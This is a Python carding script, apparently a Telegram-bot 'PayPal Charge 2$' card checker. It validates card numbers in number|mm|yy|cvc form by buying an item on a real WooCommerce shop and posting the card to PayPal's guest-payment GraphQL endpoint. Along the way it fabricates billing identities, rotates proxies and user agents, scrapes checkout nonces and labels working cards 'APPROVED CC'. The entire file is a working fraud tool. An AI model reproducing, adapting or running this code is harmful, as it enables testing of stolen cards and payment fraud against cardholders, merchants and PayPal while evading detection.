import requests
import re
import time
import random
import string
import user_agent
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
import concurrent.futures
from functools import lru_cache

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Cache for BIN lookups to avoid repeated API calls
@lru_cache(maxsize=100)
def get_bin_info_cached(bin_number):
    """Cached version of BIN lookup"""
    return get_bin_info(bin_number)

def get_rotating_user_agent():
    """Generate different types of user agents - OPTIMIZED"""
    # Pre-generate common user agents instead of generating on each call
    common_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    return random.choice(common_agents)

def get_random_proxy():
    """Get a random proxy from proxy.txt file - OPTIMIZED"""
    try:
        # Cache proxies in memory to avoid file reading every time
        if not hasattr(get_random_proxy, 'proxies'):
            with open('proxy.txt', 'r') as f:
                get_random_proxy.proxies = [line.strip() for line in f.readlines()]
        
        if get_random_proxy.proxies:
            proxy = random.choice(get_random_proxy.proxies)
            parts = proxy.split(':')
            if len(parts) == 4:
                host, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{host}:{port}',
                    'https': f'http://{username}:{password}@{host}:{port}'
                }
                return proxy_dict
        return None
    except Exception as e:
        print(f"Error reading proxy file: {str(e)}")
        return None

# BIN lookup function - UPDATED with multiple reliable APIs
def get_bin_info(bin_number):
    """Get BIN information using multiple reliable APIs with fallback - OPTIMIZED"""
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': '🏳️'
        }
    
    bin_code = bin_number[:6]
    
    # Try multiple APIs in sequence with timeout
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            # Reduced timeout for faster failure
            response = requests.get(api_url, headers=headers, timeout=5, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                # Parse based on API response format
                if 'binlist.net' in api_url:
                    # binlist.net format
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    # antipublic.cc format
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                # Clean up the values
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                # If we got valid data, return it
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except Exception:
            continue
    
    # If all APIs failed, return default values
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': '🏳️'
    }

def get_country_emoji(country_code):
    """Convert country code to emoji - OPTIMIZED"""
    if not country_code or len(country_code) != 2:
        return '🏳️'
    
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return '🏳️'

def check_status_paypal(result):
    """Check PayPal payment status similar to p.py's check_status - OPTIMIZED"""
    # Use sets for faster lookups
    approved_patterns = {
        'CHARGE 2$', 'APPROVED CCN', 'APPROVED - AVS', 'APPROVED!',
        'succeeded', 'Thank You For Donation', 'payment has already been processed', 'Success'
    }
    
    declined_patterns = {
        'DECLINED', 'INSUFFICIENT_FUNDS', 'CARD_DECLINED', 
        'TRANSACTION_NOT_PERMITTED', 'DO_NOT_HONOR', 'INVALID_ACCOUNT'
    }
    
    cvv_patterns = {
        'INVALID_SECURITY_CODE', 'CVV_FAILED'
    }
    
    otp_patterns = {
        'is3DSecureRequired', 'OTP', '3DSECURE'
    }
    
    # Check patterns more efficiently
    if any(pattern in result for pattern in approved_patterns):
        return "APPROVED CC", "Approved", True
    
    if any(pattern in result for pattern in cvv_patterns):
        return "APPROVED CC", "Approved - CVV Issue", True
    
    if any(pattern in result for pattern in otp_patterns):
        return "OTP REQUIRED", "3D Secure Verification Required", False
    
    if any(pattern in result for pattern in declined_patterns):
        return "DECLINED CC", result, False
    
    return "DECLINED CC", result, False

# Pre-generate common data to avoid repeated generation
FIRST_NAMES = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah", "Omar", "Layla", "Youssef", "Nour", 
               "Hannah", "Yara", "Khaled", "Sara", "Lina", "Nada", "Hassan", "Amina", "Rania", "Hussein"]
LAST_NAMES = ["Khalil", "Abdullah", "Alwan", "Shammari", "Maliki", "Smith", "Johnson", "Williams", "Jones", "Brown"]
CITIES = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
STATES = ["NY", "CA", "IL", "TX", "AZ"]
STREETS = ["Main St", "Park Ave", "Oak St", "Cedar St", "Maple Ave"]
ZIP_CODES = ["10001", "90001", "60601", "77001", "85001"]

def generate_full_name():
    """Generate random full name - OPTIMIZED"""
    first_name = random.choice(FIRST_NAMES)
    last_name = random.choice(LAST_NAMES)
    return first_name, last_name

def generate_address():
    """Generate random address - OPTIMIZED"""
    index = random.randint(0, len(CITIES) - 1)
    city = CITIES[index]
    state = STATES[index]
    street_address = f"{random.randint(1, 999)} {random.choice(STREETS)}"
    zip_code = ZIP_CODES[index]
    return city, state, street_address, zip_code

def generate_random_account():
    """Generate random email - OPTIMIZED"""
    name = ''.join(random.choices(string.ascii_lowercase, k=10))  # Reduced length
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@gmail.com"

def generate_phone_number():
    """Generate random phone number - OPTIMIZED"""
    return f"303{''.join(random.choices(string.digits, k=7))}"

def generate_random_code():
    """Generate random session code - OPTIMIZED"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=17))

def make_request_with_retry(session, method, url, **kwargs):
    """Helper function to make requests with retry logic"""
    max_retries = 2
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs, timeout=10)  # Reduced timeout
            response.raise_for_status()
            return response
        except requests.RequestException as e:
            if attempt == max_retries - 1:
                raise e
            time.sleep(0.5)  # Short delay before retry

def check_card_paypal(cc_line):
    """Main PayPal card check function - OPTIMIZED for speed"""
    start_time = time.time()
    
    try:
        # Parse card details
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return "❌ Invalid card format. Expected: number|mm|yy|cvc"

        n, mm, yy, cvc = parts

        # Get BIN information using cache
        bin_info = get_bin_info_cached(n[:6])

        # Format month and year
        if len(mm) == 1:
            mm = f'0{mm}'
        if "20" not in yy:
            yy = f'20{yy}'

        # Generate user info
        first_name, last_name = generate_full_name()
        city, state, street_address, zip_code = generate_address()
        acc = generate_random_account()
        phone_num = generate_phone_number()

        # Create session with connection pooling
        user = get_rotating_user_agent()
        session = requests.Session()
        
        # Use proxy if available
        proxy = get_random_proxy()

        # First request: Add to cart
        files = {
            'quantity': (None, '1'),
            'add-to-cart': (None, '4451'),
        }
        multipart_data = MultipartEncoder(fields=files)
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': multipart_data.content_type,
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/shop/i-buy/',
            'user-agent': user,
        }

        try:
            response = make_request_with_retry(session, 'POST', 'https://switchupcb.com/shop/i-buy/', 
                                             headers=headers, data=multipart_data, proxies=proxy, verify=False)
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"Add to cart failed: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Second request: Checkout
        headers = {
            'authority': 'switchupcb.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://switchupcb.com/cart/',
            'user-agent': user,
        }

        try:
            response = make_request_with_retry(session, 'GET', 'https://switchupcb.com/checkout/', 
                                             headers=headers, proxies=proxy, verify=False)
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"Checkout failed: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Extract security tokens with error handling
        try:
            sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text)
            nonce = re.search(r'save_checkout_form.*?nonce":"(.*?)"', response.text)
            check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text)
            create = re.search(r'create_order.*?nonce":"(.*?)"', response.text)
            
            if not all([sec, nonce, check, create]):
                raise AttributeError("Missing security tokens")
                
            sec = sec.group(1)
            nonce = nonce.group(1)
            check = check.group(1)
            create = create.group(1)
            
        except AttributeError:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, "Failed to extract security tokens", 
                                bin_info, elapsed_time, False)

        # Update order review
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user,
        }

        params = {'wc-ajax': 'update_order_review'}
        data = f'security={sec}&payment_method=stripe&country=US&state={state}&postcode={zip_code}&city={city}&address={street_address}&address_2=&s_country=US&s_state={state}&s_postcode={zip_code}&s_city={city}&s_address={street_address}&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fswitchupcb.com%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone_num}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'

        try:
            response = make_request_with_retry(session, 'POST', 'https://switchupcb.com/', 
                                             params=params, headers=headers, data=data, proxies=proxy, verify=False)
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"Update order review failed: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Create order
        headers = {
            'authority': 'switchupcb.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://switchupcb.com',
            'referer': 'https://switchupcb.com/checkout/',
            'user-agent': user,
        }

        params = {'wc-ajax': 'ppc-create-order'}
        json_data = {
            'nonce': create,
            'payer': None,
            'bn_code': 'Woo_PPCP',
            'context': 'checkout',
            'order_id': '0',
            'payment_method': 'ppcp-gateway',
            'funding_source': 'card',
            'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone_num}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_session_entry=https%3A%2F%2Fswitchupcb.com%2Fshop%2Fdrive-me-so-crazy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
            'createaccount': False,
            'save_payment_method': False,
        }

        try:
            response = make_request_with_retry(session, 'POST', 'https://switchupcb.com/', 
                                             params=params, headers=headers, json=json_data, proxies=proxy, verify=False)
            order_id = response.json()['data']['id']
            pcp = response.json()['data']['custom_id']
        except (requests.RequestException, KeyError, ValueError) as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"Failed to extract order ID: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Generate random session IDs
        lol1 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol2 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        lol3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=11))
        session_id = f'uid_{lol1}_{lol3}'
        button_session_id = f'uid_{lol2}_{lol3}'

        # PayPal request
        headers = {
            'authority': 'www.paypal.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://www.paypal.com/smart/buttons',
            'user-agent': user,
        }

        params = {
            'sessionID': session_id,
            'buttonSessionID': button_session_id,
            'locale.x': 'ar_EG',
            'commit': 'true',
            'hasShippingCallback': 'false',
            'env': 'production',
            'country.x': 'EG',
            'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
            'disable-card': '',
            'token': order_id,
        }

        try:
            response = make_request_with_retry(session, 'GET', 'https://www.paypal.com/smart/card-fields', 
                                             params=params, headers=headers, proxies=proxy, verify=False)
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"PayPal card fields failed: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Final payment request
        headers = {
            'authority': 'www.paypal.com',
            'accept': '*/*',
            'content-type': 'application/json',
            'origin': 'https://www.paypal.com',
            'referer': 'https://www.paypal.com/smart/card-fields',
            'user-agent': user,
        }

        json_data = {
            'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
            'variables': {
                'token': order_id,
                'card': {
                    'cardNumber': n,
                    'type': 'VISA',
                    'expirationDate': mm+'/'+yy,
                    'postalCode': zip_code,
                    'securityCode': cvc,
                },
                'firstName': first_name,
                'lastName': last_name,
                'billingAddress': {
                    'givenName': first_name,
                    'familyName': last_name,
                    'line1': street_address,
                    'line2': None,
                    'city': city,
                    'state': state,
                    'postalCode': zip_code,
                    'country': 'US',
                },
                'email': acc,
                'currencyConversionType': 'VENDOR',
            },
            'operationName': 'payWithCard',
        }

        try:
            response = make_request_with_retry(session, 'POST', 'https://www.paypal.com/graphql', 
                                             headers=headers, json=json_data, proxies=proxy, verify=False)
            last = response.text
        except requests.RequestException as e:
            elapsed_time = time.time() - start_time
            return format_response("DECLINED CC", n, mm, yy, cvc, f"Final payment failed: {str(e)}", 
                                bin_info, elapsed_time, False)

        # Process response and format result
        elapsed_time = time.time() - start_time
        
        # Determine status based on response
        if ('ADD_SHIPPING_ERROR' in last or
            'NEED_CREDIT_CARD' in last or
            '"status": "succeeded"' in last or
            'Thank You For Donation.' in last or
            'Your payment has already been processed' in last or
            'Success ' in last):
            status, reason, approved = "APPROVED CC", "Approved", True
        elif 'is3DSecureRequired' in last or 'OTP' in last:
            status, reason, approved = "OTP REQUIRED", "3D Secure Verification Required", True
        elif 'INVALID_SECURITY_CODE' in last:
            status, reason, approved = "APPROVED CC", "Approved - CVV Issue", True
        elif 'INVALID_BILLING_ADDRESS' in last:
            status, reason, approved = "APPROVED CC", "Approved - AVS Issue", True
        elif 'EXISTING_ACCOUNT_RESTRICTED' in last:
            status, reason, approved = "APPROVED CC", "Approved - Account Restricted", True
        else:
            try:
                message = response.json()['errors'][0]['message']
                code = response.json()['errors'][0]['data'][0]['code']
                status, reason, approved = "DECLINED CC", f"{code}: {message}", False
            except:
                status, reason, approved = "DECLINED CC", "Unknown Error", False

        return format_response(status, n, mm, yy, cvc, reason, bin_info, elapsed_time, approved)

    except Exception as e:
        elapsed_time = time.time() - start_time
        bin_info = get_bin_info_cached(cc_line.split('|')[0][:6]) if '|' in cc_line else get_bin_info_cached('')
        return format_response("ERROR", *cc_line.split('|'), f"Request failed: {str(e)}", 
                             bin_info, elapsed_time, False)

def format_response(status, n, mm, yy, cvc, reason, bin_info, elapsed_time, approved):
    """Helper function to format response consistently"""
    emoji = "❌" if not approved else "✅"
    return f"""
{status} {emoji}

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {reason}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ PayPal Charge 2$

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

# For standalone testing
if __name__ == "__main__":
    card = input("Enter card (number|mm|yy|cvc): ").strip()
    result = check_card_paypal(card)
    print(result)
